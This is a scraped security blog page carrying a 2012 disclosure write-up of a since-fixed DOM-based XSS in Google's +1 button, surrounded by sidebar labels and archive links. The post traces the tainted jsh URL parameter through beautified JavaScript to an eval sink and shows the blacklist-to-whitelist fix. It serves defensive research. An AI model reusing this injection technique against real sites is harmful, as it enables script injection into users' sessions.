* [testing](https://blog.mindedsecurity.com/search/label/testing)
  (
  1
  )
* [Threat Modeling](https://blog.mindedsecurity.com/search/label/Threat%20Modeling)
  (
  1
  )
* [twitter](https://blog.mindedsecurity.com/search/label/twitter)
  (
  1
  )
* [UNECE R155](https://blog.mindedsecurity.com/search/label/UNECE%20R155)
  (
  1
  )
* [unzip directory traversal](https://blog.mindedsecurity.com/search/label/unzip%20directory%20traversal)
  (
  1
  )
* [UPnP](https://blog.mindedsecurity.com/search/label/UPnP)
  (
  2
  )
* [validation](https://blog.mindedsecurity.com/search/label/validation)
  (
  1
  )
* [Vulnerabilities statistics](https://blog.mindedsecurity.com/search/label/Vulnerabilities%20statistics)
  (
  1
  )
* [WAF](https://blog.mindedsecurity.com/search/label/WAF)
  (
  1
  )
* [WAPT](https://blog.mindedsecurity.com/search/label/WAPT)
  (
  1
  )
* [Web Application Firewall](https://blog.mindedsecurity.com/search/label/Web%20Application%20Firewall)
  (
  1
  )
* [web architecture security](https://blog.mindedsecurity.com/search/label/web%20architecture%20security)
  (
  1
  )
* [Web Attacks](https://blog.mindedsecurity.com/search/label/Web%20Attacks)
  (
  23
  )
* [web cache](https://blog.mindedsecurity.com/search/label/web%20cache)
  (
  1
  )
* [web injection](https://blog.mindedsecurity.com/search/label/web%20injection)
  (
  4
  )
* [Web Security](https://blog.mindedsecurity.com/search/label/Web%20Security)
  (
  23
  )
* [Windows Phone Security](https://blog.mindedsecurity.com/search/label/Windows%20Phone%20Security)
  (
  1
  )
* [WWeb Security](https://blog.mindedsecurity.com/search/label/WWeb%20Security)
  (
  2
  )
* [zeus p2p](https://blog.mindedsecurity.com/search/label/zeus%20p2p)
  (
  3
  )

## Blog Archive

* [May](https://blog.mindedsecurity.com/2024/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2024/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2024/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2023/10/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2023/06/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2023/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2023/02/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2022/07/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2021/12/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2021/08/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2021/05/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2021/02/)
  (
  1
  )
* [January](https://blog.mindedsecurity.com/2021/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2020/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2020/10/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2020/07/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2020/06/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2020/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2020/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2020/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2020/02/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2019/04/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2018/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2018/09/)
  (
  3
  )
* [July](https://blog.mindedsecurity.com/2018/07/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2018/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2018/04/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2017/11/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2017/06/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2016/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2016/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2015/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2015/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2015/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2015/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2015/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2015/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2015/03/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2015/02/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2014/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2014/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2014/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2013/10/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2013/04/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2013/02/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2012/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2012/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2012/09/)
  (
  4
  )
* [June](https://blog.mindedsecurity.com/2012/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2011/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2011/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2011/08/)
  (
  2
  )
* [July](https://blog.mindedsecurity.com/2011/07/)
  (
  2
  )
* [May](https://blog.mindedsecurity.com/2011/05/)
  (
  2
  )
* [April](https://blog.mindedsecurity.com/2011/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2011/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2010/10/)
  (
  8
  )
* [September](https://blog.mindedsecurity.com/2010/09/)
  (
  3
  )
* [August](https://blog.mindedsecurity.com/2010/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2010/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2010/04/)
  (
  4
  )
* [March](https://blog.mindedsecurity.com/2010/03/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2009/12/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2009/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2009/10/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2009/05/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2009/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2009/01/)
  (
  1
  )

####

Minded Security was established in Italy in 2007

with a focus on supporting businesses and

organizations to build secure products
 and services.

##### Services

* Training
* Testing
* Consulting
* Request a brochure

##### Information

* The Company
* blueclosure
* AMT – Banking Malware Detector
* Contact us
* Privacy Policy

##### Newsletter

©2015 Minded Security S.r.l. The Software Security Company - VAT IT05756380480

[Back to top](#top)



=== Content from blog.mindedsecurity.com_e74dce19_20250126_020848.html ===


[Subscribe our newsletter](https://mindedsecurity.com/newsletter)

[Minded Security](https://mindedsecurity.com)

* Industry
  + [Automotive/Maritime](https://mindedsecurity.com/industry/automotive-maritime/ "Automotive/Maritime")
  + [Financial](https://mindedsecurity.com/industry/financial/ "Financial")
  + [GDO](https://mindedsecurity.com/industry/gdo/ "GDO")
  + [Industrial Control Systems](https://mindedsecurity.com/industry/industrial-control-systems/ "Industrial Control Systems")
  + [IoT Security](https://mindedsecurity.com/industry/iot-security/ "IoT Security")
  + [Healthcare](https://mindedsecurity.com/industry/healthcare/ "Healthcare")
  + [Government](https://mindedsecurity.com/industry/government/ "Government")
* [Services](https://mindedsecurity.com/our-services/ "Services")
  + [Training](https://mindedsecurity.com/our-services/training/ "Training")
    - [Security Hackaton](https://mindedsecurity.com/services/training/security-hackaton/ "Security Hackaton")
    - [Advanced On-site Training](https://mindedsecurity.com/services/training/advanced-on-site-training/ "Advanced On-site Training")
    - [BlueClosure Training](https://mindedsecurity.com/services/training/blueclosure-training/ "BlueClosure Training")
    - [High Level Training](https://mindedsecurity.com/services/training/high-level-training/ "High Level Training")
    - [Webinar](https://mindedsecurity.com/services/training/webinar/ "Webinar")
  + [Testing](https://mindedsecurity.com/our-services/testing/ "Testing")
    - [Manual Secure Code Review](https://mindedsecurity.com/services/testing/manual-secure-code-review/ "Manual Secure Code Review")
    - [Manual WAPT](https://mindedsecurity.com/services/testing/manual-wapt/ "Manual WAPT")
    - [Cloud Security Testing](https://mindedsecurity.com/services/testing/cloud-security-testing/ "Cloud Security Testing")
    - [IoT Security](https://mindedsecurity.com/services/testing/iot-security/ "IoT Security")
    - [API Security](https://mindedsecurity.com/services/testing/api-security/ "API Security")
    - [Mobile Security Assessment](https://mindedsecurity.com/services/testing/mobile-security-assessment/ "Mobile Security Assessment")
    - [Client Side Assessment](https://mindedsecurity.com/services/testing/client-side-assessment/ "Client Side Assessment")
  + [Consulting](https://mindedsecurity.com/our-services/consulting/ "Consulting")
    - [Software Security Advisory](https://mindedsecurity.com/services/consulting/software-security-advisory/ "Software Security Advisory")
    - [5D Framework](https://mindedsecurity.com/services/consulting/5d-framework/ "5D Framework")
    - [Threat Modeling](https://mindedsecurity.com/services/consulting/threat-modeling/ "Threat Modeling")
    - [Secure Design](https://mindedsecurity.com/services/consulting/secure-design/ "Secure Design")
    - [Secure Architecture Review](https://mindedsecurity.com/services/consulting/secure-architecture-review/ "Secure Architecture Review")
    - [Secure Coding Guidelines](https://mindedsecurity.com/services/consulting/secure-coding-guidelines/ "Secure Coding Guidelines")
    - [Fixing Support](https://mindedsecurity.com/services/consulting/fixing-support/ "Fixing Support")
    - [Outsourcing Development Governance](https://mindedsecurity.com/services/consulting/outsourcing-development-governance/ "Outsourcing Development Governance")
  + [Request a brochure](https://mindedsecurity.com/request-a-brochure/ "Request a brochure")
* Resources
  + [Blog](https://blog.mindedsecurity.com/ "Blog")
  + [News](https://mindedsecurity.com/category/news/ "News")
  + [Videos](https://mindedsecurity.com/videos/ "Videos")
  + [Research](https://mindedsecurity.com/research/ "Research")
  + [Advisories](https://mindedsecurity.com/research/advisories/ "Advisories")
* [About us](https://mindedsecurity.com/our-mission/ "About us")
  + [The Company](https://mindedsecurity.com/the-company/ "The Company")
  + [Contact us](https://mindedsecurity.com/contact-us/ "Contact us")
  + [Newsletter](https://mindedsecurity.com/newsletter/ "Newsletter")
  + [Jobs](https://mindedsecurity.com/jobs/ "Jobs")
  + [Privacy Policy](https://mindedsecurity.com/privacy-policy/ "Privacy Policy")

## IMQ Minded Security Blog

[skip to main](#main)  |
[skip to sidebar](#sidebar)

Showing posts with label **CORS**. [Show all posts](https://blog.mindedsecurity.com/)

Showing posts with label **CORS**. [Show all posts](https://blog.mindedsecurity.com/)

## Monday, November 5, 2012

# [DOM XSS on Google Plus One Button](https://blog.mindedsecurity.com/2012/11/dom-xss-on-google-plus-one-button.html)

#### Introduction

[DOMinatorPro](https://dominator.mindedsecurity.com/) can be very useful to find DOM Based XSS on complex JavaScript web applications. This post will describe a Cross Origin Resource Sharing (CORS) abuse exploiting a flaw in the JavaScript Plus One code on plus.google.com.

Just to be clear, yes, it's the +1 button present on billions of pages around the internet.

The issue affected the context of https://plus.google.com which is the context of the social network.

Before going further with any details, a picture is worth a thousand words:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEheDxfrwvQ6adzFljF9GBEXsHmu1FHMvW7P4VFOlqMBafOHFRlNQKYg9s1UFV5aOzxnMOxHRcfekopCMX-zF2rSG4JRbFsLhEl2h1bD6iXqTOxj1htR2cqhshJYBTfsAK-4eEccmyK2G932/s400/plusone_DOMXss.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEheDxfrwvQ6adzFljF9GBEXsHmu1FHMvW7P4VFOlqMBafOHFRlNQKYg9s1UFV5aOzxnMOxHRcfekopCMX-zF2rSG4JRbFsLhEl2h1bD6iXqTOxj1htR2cqhshJYBTfsAK-4eEccmyK2G932/s1600/plusone_DOMXss.png)

In order to better explain the issue and show how DOMinatorPro helped me in finding the problem, and since a video is worth a thousand pictures, I [recorded a video](//www.youtube.com/watch?v=SmgnMVZ4gsM&hd=1) on Youtube [MindedSecurity channel](//www.youtube.com/user/mindedsecurity).

In the video I deliberately chose to not show a single line of JavaScript
in order to demonstrate what DOMinatorPro can do for a tester with little
knowledge of JavaScript.

In this post, on the other hand, I'd like to discuss about how the input was treated
and how Google fixed the issue with input validation.
#### Code Issue Details

The offending URL in a simplified version was:
> *https://plusone.google.com/\_/+1/fastbutton?url=http://www.example.com&ic=1&jsh=m;/\_/apps-static/\_/js/gapi/\_\_features\_\_/rt=j/ver=ZZZZ/sv=1/am=!YYYY/d=1/rs=XXX*

First of all, a *throw "Bad URL "* exception can be spotted on line 425, which actually controls for the presence of multiple callbacks (*/cb=*/) in '*l*' variable and  for the presence of classic */[@"'<>#\?&%]/* metacharacters in '*ga*'. If some of those conditions are satisfied then an exception (Bad URL) is thrown.

That is called data validation.

> ```
> 420 d = m.split(";");
> 421 d = (i = M[d.shift()]) &&  i(d);
> 422 if (!d) throw "Bad hint:" + m;
> 423 i = d = d[q]("__features__", T(r))[q](/\/$/, "") +
>                    (e[s] ? "/ed=1/exm=" + T(e) : "")
>                    + ("/cb=gapi." + J);
> 424 l = i.match(ha); // "https://apis.google.com/TAINTED/cb=gapi.loaded_0".match(/\/cb=/g)
> 425 if (!l || !(1 === l[s] &&
>                  ga[p](i) && !fa[p](i)))
>                       throw "Bad URL " + d;
> 426 e[k].apply(e, r);
> 427 L("ml0", r, I);
> 428 c[R.f] || t.___gapisync ?
>      (c = d, "loading" != u.readyState ?
>      W(c) :
>      u.write("<" + S + ' src="' + encodeURI(c) + '"></' + S + ">")) :
>      W(d, c, J)
> ....
> ```

Line 428 is the call to the function that performs a XMLHttpRequest. By following the flow on Line 532 (beautified) the '*l*' variable is tainted and it's the one that is traced by DOMinatorPro, originating by the location.href jsh parameter:

starting from: *jsh=m;/\_/apps-static/\_/js/gapi/....*

becomes *"https://apis.google.com/\_/apps-static/\_/js/gapi/..../cb=gapi.loaded\_0"*
and *l[q]* is the replace function :

> ```
> function W(){
> ...
> 531 a = v.XMLHttpRequest,
> 532 l = l[q](/^https?:\/\/[^\/]+\//, "/"),
> 533 m = new a;
> 534 m.open("GET", l, f)
> ...
> }
> ```

So on line 532 https://apis.google.com/ is removed and '*l*' becomes:

*"/\_/apps-static/\_/js/gapi/..../cb=gapi.loaded\_0"*

The reason why there is execution is that the response is evaluated using the following code:

> ```
> B=function(a,b,c){v.execScript?v.execScript(b,"JavaScript"):c?a.eval(b):
>  (a=a.document,c=a.createElement("script"),c.defer=i,
>  c.appendChild(a.createTextNode(b)...
>
> ```

Now, about the fix, I suggested Google to perform some input validation using A tag properties,
> ```
> var aa=document.createElement("a");
> aa.href=untrustedURL;
>
>
> ```

and then use aa.pathname to be sure it's the browser doing the parsing job but probably it does not work perfectly for all browsers.

In fact Google devs decided to add more data validation

> ```
> if (!l || !(1 === l[v] && ha[q](d) &&
>             ga[q](d) && h && 1 === h[v]))
>   throw "Bad URL " + a;
>
> ```

that code changes one check and adds another condition, to the previous one we already discussed.

In particular:
> ```
>
> ga[q](d) changes from /[@"'><#\?&%]/ (blacklist)
>                  to  /^[\/_a-zA-Z0-9,.\-!:=]+$/ (whitelist)
>
> And
> 1 === h[v] has been added and means if there is
>             only one "//"  (like http://  )
>
> ```

Which seems pretty solid to me, at least in the context of this specific issue; of course, bypasses are always around the corner, but I'm sure Google security guys took the best effort to be sure it's safe!

#### Conclusions

DOM Based XSS still remains quite untested, and that's because JavaScript is not easy to analyze in complex scenarios.

[DOMinatorPro](https://dominator.mindedsecurity.com/) can really help in finding issue in the easy-to-hard-to-identify range of DOM Based XSS category, because DOMinatorPro is not as simple as you might think, it's a complex piece of software and with a large knowledge base in it.

By

[Stefano Di Paola](https://www.blogger.com/profile/18241677936736054546 "author profile")

at

[5:50 AM](https://blog.mindedsecurity.com/2012/11/dom-xss-on-google-plus-one-button.html "permanent link")

[6 comments
:](https://blog.mindedsecurity.com/2012/11/dom-xss-on-google-plus-one-button.html#comment-form)

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=3568710698888076388&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=3568710698888076388&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=3568710698888076388&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=3568710698888076388&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=3568710698888076388&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=3568710698888076388&target=pinterest "Share to Pinterest")

Labels:
[Application Security](https://blog.mindedsecurity.com/search/label/Application%20Security)
,
[CORS](https://blog.mindedsecurity.com/search/label/CORS)
,
[DOM Based XSS](https://blog.mindedsecurity.com/search/label/DOM%20Based%20XSS)
,
[Dom Xss](https://blog.mindedsecurity.com/search/label/Dom%20Xss)
,
[DOMinatorPro](https://blog.mindedsecurity.com/search/label/DOMinatorPro)
,
[Google Plus One](https://blog.mindedsecurity.com/search/label/Google%20Plus%20One)
,
[Web Security](https://blog.mindedsecurity.com/search/label/Web%20Security)

[Older Posts](https://blog.mindedsecurity.com/search/label/CORS?updated-max=2012-11-05T05:50:00-08:00&max-results=20&start=20&by-date=false "Older Posts")

[Home](https://blog.mindedsecurity.com/)

Subscribe to:
[Posts
(
Atom
)](https://blog.mindedsecurity.com/feeds/posts/default)

##

## Labels

* [3rd party javascript](https://blog.mindedsecurity.com/search/label/3rd%20party%20javascript)
  (
  2
  )
* [absolute path check](https://blog.mindedsecurity.com/search/label/absolute%20path%20check)
  (
  1
  )
* [Adobe](https://blog.mindedsecurity.com/search/label/Adobe)
  (
  3
  )
* [Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
  (
  5
  )
* [adware](https://blog.mindedsecurity.com/search/label/adware)
  (
  1
  )
* [AFNetworking](https://blog.mindedsecurity.com/search/label/AFNetworking)
  (
  1
  )
* [agile](https://blog.mindedsecurity.com/search/label/agile)
  (
  1
  )
* [AMT](https://blog.mindedsecurity.com/search/label/AMT)
  (
  1
  )
* [Android](https://blog.mindedsecurity.com/search/label/Android)
  (
  1
  )
* [Android Security](https://blog.mindedsecurity.com/search/label/Android%20Security)
  (
  6
  )
* [Anti-Tampering](https://blog.mindedsecurity.com/search/label/Anti-Tampering)
  (
  2
  )
* [Antitamper](https://blog.mindedsecurity.com/search/label/Antitamper)
  (
  2
  )
* [Applet Security](https://blog.mindedsecurity.com/search/label/Applet%20Security)
  (
  6
  )
* [Application Security](https://blog.mindedsecurity.com/search/label/Application%20Security)
  (
  23
  )
* [appsec](https://blog.mindedsecurity.com/search/label/appsec)
  (
  1
  )
* [Arbitrary Code Execution](https://blog.mindedsecurity.com/search/label/Arbitrary%20Code%20Execution)
  (
  4
  )
* [architecture](https://blog.mindedsecurity.com/search/label/architecture)
  (
  1
  )
* [asp.net](https://blog.mindedsecurity.com/search/label/asp.net)
  (
  2
  )
* [ast](https://blog.mindedsecurity.com/search/label/ast)
  (
  1
  )
* [attacks](https://blog.mindedsecurity.com/search/label/attacks)
  (
  1
  )
* [Authentication](https://blog.mindedsecurity.com/search/label/Authentication)
  (
  1
  )
* [Autoloaded File Inclusion](https://blog.mindedsecurity.com/search/label/Autoloaded%20File%20Inclusion)
  (
  1
  )
* [Automotive](https://blog.mindedsecurity.com/search/label/Automotive)
  (
  1
  )
* [Banking](https://blog.mindedsecurity.com/search/label/Banking)
  (
  4
  )
* [Banking Malware](https://blog.mindedsecurity.com/search/label/Banking%20Malware)
  (
  1
  )
* [blackbox](https://blog.mindedsecurity.com/search/label/blackbox)
  (
  1
  )
* [blueclosure](https://blog.mindedsecurity.com/search/label/blueclosure)
  (
  1
  )
* [burp](https://blog.mindedsecurity.com/search/label/burp)
  (
  1
  )
* [canonicalization](https://blog.mindedsecurity.com/search/label/canonicalization)
  (
  1
  )
* [Certificate Pinning](https://blog.mindedsecurity.com/search/label/Certificate%20Pinning)
  (
  1
  )
* [chat](https://blog.mindedsecurity.com/search/label/chat)
  (
  1
  )
* [Client Side HTTP Parameter Pollution](https://blog.mindedsecurity.com/search/label/Client%20Side%20HTTP%20Parameter%20Pollution)
  (
  1
  )
* [cloud](https://blog.mindedsecurity.com/search/label/cloud)
  (
  1
  )
* [cloud browsing](https://blog.mindedsecurity.com/search/label/cloud%20browsing)
  (
  1
  )
* [Code Protection](https://blog.mindedsecurity.com/search/label/Code%20Protection)
  (
  2
  )
* [compliance](https://blog.mindedsecurity.com/search/label/compliance)
  (
  1
  )
* [Concrete5](https://blog.mindedsecurity.com/search/label/Concrete5)
  (
  1
  )
* [Content Security Policy](https://blog.mindedsecurity.com/search/label/Content%20Security%20Policy)
  (
  1
  )
* CORS

  (
  1
  )
* [Cross Site Scripting](https://blog.mindedsecurity.com/search/label/Cross%20Site%20Scripting)
  (
  7
  )
* [CVE-2015-6497](https://blog.mindedsecurity.com/search/label/CVE-2015-6497)
  (
  1
  )
* [CVE-2021-44228](https://blog.mindedsecurity.com/search/label/CVE-2021-44228)
  (
  1
  )
* [DAB](https://blog.mindedsecurity.com/search/label/DAB)
  (
  1
  )
* [defense](https://blog.mindedsecurity.com/search/label/defense)
  (
  1
  )
* [deobfuscation](https://blog.mindedsecurity.com/search/label/deobfuscation)
  (
  2
  )
* [DeviceSecurity](https://blog.mindedsecurity.com/search/label/DeviceSecurity)
  (
  2
  )
* [DEVSECOPS](https://blog.mindedsecurity.com/search/label/DEVSECOPS)
  (
  1
  )
* [dll](https://blog.mindedsecurity.com/search/label/dll)
  (
  1
  )
* [DNS Rebinding](https://blog.mindedsecurity.com/search/label/DNS%20Rebinding)
  (
  2
  )
* [DOM Based XSS](https://blog.mindedsecurity.com/search/label/DOM%20Based%20XSS)
  (
  9
  )
* [Dom Xss](https://blog.mindedsecurity.com/search/label/Dom%20Xss)
  (
  15
  )
* [DOMinator](https://blog.mindedsecurity.com/search/label/DOMinator)
  (
  11
  )
* [DOMinatorPro](https://blog.mindedsecurity.com/search/label/DOMinatorPro)
  (
  9
  )
* [download](https://blog.mindedsecurity.com/search/label/download)
  (
  1
  )
* [Dyre](https://blog.mindedsecurity.com/search/label/Dyre)
  (
  1
  )
* [Encryption](https://blog.mindedsecurity.com/search/label/Encryption)
  (
  3
  )
* [Expression Language Injection](https://blog.mindedsecurity.com/search/label/Expression%20Language%20Injection)
  (
  3
  )
* [fixing](https://blog.mindedsecurity.com/search/label/fixing)
  (
  1
  )
* [Flex](https://blog.mindedsecurity.com/search/label/Flex)
  (
  2
  )
* [Flutter](https://blog.mindedsecurity.com/search/label/Flutter)
  (
  1
  )
* [gameover](https://blog.mindedsecurity.com/search/label/gameover)
  (
  1
  )
* [Google Plus One](https://blog.mindedsecurity.com/search/label/Google%20Plus%20One)
  (
  1
  )
* [google security](https://blog.mindedsecurity.com/search/label/google%20security)
  (
  1
  )
* [Http Parameter Pollution](https://blog.mindedsecurity.com/search/label/Http%20Parameter%20Pollution)
  (
  2
  )
* [Http Request Splitting](https://blog.mindedsecurity.com/search/label/Http%20Request%20Splitting)
  (
  1
  )
* [Information Disclosure](https://blog.mindedsecurity.com/search/label/Information%20Disclosure)
  (
  2
  )
* [innovation](https://blog.mindedsecurity.com/search/label/innovation)
  (
  2
  )
* [intruder](https://blog.mindedsecurity.com/search/label/intruder)
  (
  1
  )
* [iOS](https://blog.mindedsecurity.com/search/label/iOS)
  (
  2
  )
* [iOS Security](https://blog.mindedsecurity.com/search/label/iOS%20Security)
  (
  7
  )
* [IoT](https://blog.mindedsecurity.com/search/label/IoT)
  (
  2
  )
* [ISO21434](https://blog.mindedsecurity.com/search/label/ISO21434)
  (
  1
  )
* [J2EE](https://blog.mindedsecurity.com/search/label/J2EE)
  (
  1
  )
* [Java](https://blog.mindedsecurity.com/search/label/Java)
  (
  5
  )
* [Java Faces](https://blog.mindedsecurity.com/search/label/Java%20Faces)
  (
  1
  )
* [Java Security](https://blog.mindedsecurity.com/search/label/Java%20Security)
  (
  2
  )
* [javascript](https://blog.mindedsecurity.com/search/label/javascript)
  (
  4
  )
* [JavaScript Security](https://blog.mindedsecurity.com/search/label/JavaScript%20Security)
  (
  2
  )
* [JNLP Security](https://blog.mindedsecurity.com/search/label/JNLP%20Security)
  (
  1
  )
* [jQuery](https://blog.mindedsecurity.com/search/label/jQuery)
  (
  2
  )
* [JSON](https://blog.mindedsecurity.com/search/label/JSON)
  (
  1
  )
* [Libraries Security](https://blog.mindedsecurity.com/search/label/Libraries%20Security)
  (
  1
  )
* [Liferay](https://blog.mindedsecurity.com/search/label/Liferay)
  (
  1
  )
* [Linkedin.com](https://blog.mindedsecurity.com/search/label/Linkedin.com)
  (
  1
  )
* [Log4J](https://blog.mindedsecurity.com/search/label/Log4J)
  (
  1
  )
* [Magento](https://blog.mindedsecurity.com/search/label/Magento)
  (
  1
  )
* [malware](https://blog.mindedsecurity.com/search/label/malware)
  (
  9
  )
* [malware detector](https://blog.mindedsecurity.com/search/label/malware%20detector)
  (
  1
  )
* [MAPT](https://blog.mindedsecurity.com/search/label/MAPT)
  (
  4
  )
* [maxthon](https://blog.mindedsecurity.com/search/label/maxthon)
  (
  1
  )
* [microservices](https://blog.mindedsecurity.com/search/label/microservices)
  (
  1
  )
* [MitM](https://blog.mindedsecurity.com/search/label/MitM)
  (
  2
  )
* [Mobile](https://blog.mindedsecurity.com/search/label/Mobile)
  (
  5
  )
* [Mobile Security](https://blog.mindedsecurity.com/search/label/Mobile%20Security)
  (
  4
  )
* [MSTG](https://blog.mindedsecurity.com/search/label/MSTG)
  (
  3
  )
* [mvc](https://blog.mindedsecurity.com/search/label/mvc)
  (
  1
  )
* [Obfuscation](https://blog.mindedsecurity.com/search/label/Obfuscation)
  (
  3
  )
* [Omniture](https://blog.mindedsecurity.com/search/label/Omniture)
  (
  2
  )
* [Oracle NetBeans](https://blog.mindedsecurity.com/search/label/Oracle%20NetBeans)
  (
  1
  )
* [OWASP](https://blog.mindedsecurity.com/search/label/OWASP)
  (
  6
  )
* [OWASP 5D](https://blog.mindedsecurity.com/search/label/OWASP%205D)
  (
  2
  )
* [OWASP SAMM](https://blog.mindedsecurity.com/search/label/OWASP%20SAMM)
  (
  2
  )
* [OWASP Summit](https://blog.mindedsecurity.com/search/label/OWASP%20Summit)
  (
  1
  )
* [OWASP Top Ten](https://blog.mindedsecurity.com/search/label/OWASP%20Top%20Ten)
  (
  3
  )
* [p2p encryption](https://blog.mindedsecurity.com/search/label/p2p%20encryption)
  (
  1
  )
* [path traversal](https://blog.mindedsecurity.com/search/label/path%20traversal)
  (
  3
  )
* [peer to peer encryption](https://blog.mindedsecurity.com/search/label/peer%20to%20peer%20encryption)
  (
  1
  )
* [Polyglots](https://blog.mindedsecurity.com/search/label/Polyglots)
  (
  1
  )
* [Primefaces](https://blog.mindedsecurity.com/search/label/Primefaces)
  (
  1
  )
* [privacy](https://blog.mindedsecurity.com/search/label/privacy)
  (
  1
  )
* [puffin](https://blog.mindedsecurity.com/search/label/puffin)
  (
  1
  )
* [RAT](https://blog.mindedsecurity.com/search/label/RAT)
  (
  1
  )
* [RAT WARS](https://blog.mindedsecurity.com/search/label/RAT%20WARS)
  (
  1
  )
* [RATDET](https://blog.mindedsecurity.com/search/label/RATDET)
  (
  1
  )
* [RATWARS](https://blog.mindedsecurity.com/search/label/RATWARS)
  (
  1
  )
* [RDS](https://blog.mindedsecurity.com/search/label/RDS)
  (
  1
  )
* [Remote Code Execution](https://blog.mindedsecurity.com/search/label/Remote%20Code%20Execution)
  (
  3
  )
* [remote working](https://blog.mindedsecurity.com/search/label/remote%20working)
  (
  1
  )
* [reverse engineering](https://blog.mindedsecurity.com/search/label/reverse%20engineering)
  (
  1
  )
* [Same Origin Policy](https://blog.mindedsecurity.com/search/label/Same%20Origin%20Policy)
  (
  1
  )
* [sanitization](https://blog.mindedsecurity.com/search/label/sanitization)
  (
  1
  )
* [sast](https://blog.mindedsecurity.com/search/label/sast)
  (
  3
  )
* [Screen Control](https://blog.mindedsecurity.com/search/label/Screen%20Control)
  (
  1
  )
* [screenshot security](https://blog.mindedsecurity.com/search/label/screenshot%20security)
  (
  2
  )
* [SDL](https://blog.mindedsecurity.com/search/label/SDL)
  (
  2
  )
* [security](https://blog.mindedsecurity.com/search/label/security)
  (
  2
  )
* [security tools](https://blog.mindedsecurity.com/search/label/security%20tools)
  (
  1
  )
* [semgrep](https://blog.mindedsecurity.com/search/label/semgrep)
  (
  3
  )
* [Sharepoint](https://blog.mindedsecurity.com/search/label/Sharepoint)
  (
  1
  )
* [slack](https://blog.mindedsecurity.com/search/label/slack)
  (
  1
  )
* [Software Security Governance](https://blog.mindedsecurity.com/search/label/Software%20Security%20Governance)
  (
  1
  )
* [source code](https://blog.mindedsecurity.com/search/label/source%20code)
  (
  1
  )
* [Spring MVC](https://blog.mindedsecurity.com/search/label/Spring%20MVC)
  (
  1
  )
* [SQL Injection](https://blog.mindedsecurity.com/search/label/SQL%20Injection)
  (
  1
  )
* [SSL](https://blog.mindedsecurity.com/search/label/SSL)
  (
  2
  )
* [static analysis](https://blog.mindedsecurity.com/search/label/static%20analysis)
  (
  1
  )
* [Stored DOM Based XSS](https://blog.mindedsecurity.com/search/label/Stored%20DOM%20Based%20XSS)
  (
  1
  )
* [STRATEGY](https://blog.mindedsecurity.com/search/label/STRATEGY)
  (
  1
  )
* [superfish](https://blog.mindedsecurity.com/search/label/superfish)
  (
  1
  )
